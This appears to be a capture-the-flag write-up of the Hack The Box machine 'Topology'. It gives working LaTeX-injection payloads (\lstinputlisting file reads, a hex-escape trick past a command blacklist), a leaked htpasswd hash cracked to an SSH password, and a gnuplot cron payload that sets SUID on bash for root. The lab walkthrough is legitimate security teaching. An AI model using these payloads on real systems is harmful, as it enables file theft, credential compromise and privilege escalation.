---
layout: post
title: "HTB: Topology"
subtitle: "LaTeX injection LFI read an htpasswd hash that cracked to SSH, then a root cron running gnuplot on a world-writable dir set the bash SUID bit"
date: 2023-06-19
tags: [htb, linux, lfi, latex-injection, cron, privesc]
category: writeups
kind: machine
tldr: "A LaTeX equation renderer let me read arbitrary files with lstinputlisting. I pulled the dev vhost's htpasswd hash, cracked it with john, and logged in over SSH. Root came from a cron that ran every .plt file in a world-writable /opt/gnuplot as root, so a gnuplot system call set the SUID bit on bash."
---

## the box

Topology is a Linux box running OpenSSH 8.2p1 (Ubuntu 4ubuntu0.7) and Apache 2.4.41 on Ubuntu. The main site is Miskatonic University's Topology Group. Vhost fuzzing turned up `stats`, `dev`, and a LaTeX equation generator at `latex.topology.htb/equation.php`.

## recon

nmap showed 22 and 80. The homepage leaked the email `lklein@topology.htb`, and `ffuf` against the `Host` header found three subdomains. `stats.topology.htb` returned 200 with a graph and a `/files` listing. `dev.topology.htb` returned 401, sitting behind HTTP basic auth, which means an `.htpasswd` somewhere. `latex.topology.htb/equation.php` was linked from the main site and rendered LaTeX equations on the fly.

## foothold

I assumed command injection on the LaTeX endpoint at first and got nowhere. The endpoint also ran a blacklist that stripped the obvious write/include primitives: `\begin`, `\immediate`, `\usepackage`, `\input`, `\write`, `\loop`, `\include`, `\@`, `\while`, `\def`, `\url`, `\href`, and `\end` were all blocked. That kills the usual `\write18` shell-out and `\input` LFI. LaTeX is mostly exploitable for file read and path traversal rather than direct RCE anyway, so I tested commands the filter missed. `\lstinputlisting` was not on the list, and wrapping it in dollar signs escapes into inline math mode so the renderer accepts it:

```
$\lstinputlisting{/etc/hostname}$
```

`\lstinputlisting` is a listings package command that reads a file into the document, so it doubles as an LFI primitive. The blacklist could also be sidestepped with TeX hex escapes (`^^77` for `w`, so `\^^77rite` slips past the `\write` filter), but `\lstinputlisting` was enough on its own. With file read working, I went after the basic-auth credentials for the dev vhost:

```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

URL-encoded through the endpoint:

```
http://latex.topology.htb/equation.php?eqn=%24%5Clstinputlisting%7B%2Fvar%2Fwww%2Fdev%2F.htpasswd%7D%24&submit=
```

That returned the htpasswd entry:

```
vdaisley:$apr1$10NUB/S2$58eeNVirnRDB5zAIbIxTYO
```

## user

I cracked the apr1 hash with john:

```bash
john --wordlist=rockyou.txt hash   # -> calculus20
```

The dev vhost itself held nothing useful, but `vdaisley:calculus20` worked over SSH. I logged in and read the user flag.

## root

`sudo -l` was a dead end, vdaisley could not run sudo at all. linpeas flagged `/opt/gnuplot` as unexpected and world-writable (`drwx-wx-wx`). pspy showed a root cron walking that directory and running every plot file through gnuplot:

```
find /opt/gnuplot -name *.plt -exec gnuplot {} \;
```

So anything I dropped as a `.plt` ran as root. POSIX commands like chmod did not work directly because gnuplot expects its own syntax, but the gnuplot manual has a `system` command that shells out. I dropped a plot file that set the SUID bit on bash:

```bash
echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/priv.plt
```

When the cron fired, bash became SUID root:

```
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Then `/bin/bash -p` kept the effective root UID and dropped me into a root shell to read the root flag.

## takeaway

LaTeX renderers are a file-read sink waiting to happen, and `\lstinputlisting` reads any path the web user can. The blacklist tried to stop the dangerous commands but missed `\lstinputlisting` entirely, and even the blocked ones fell to hex escapes. Storing an htpasswd hash where that user can reach it leaked the basic-auth credential straight into a crackable hash. The root step was a classic world-writable cron target, and gnuplot's `system` command turned a plotting job into arbitrary root execution.
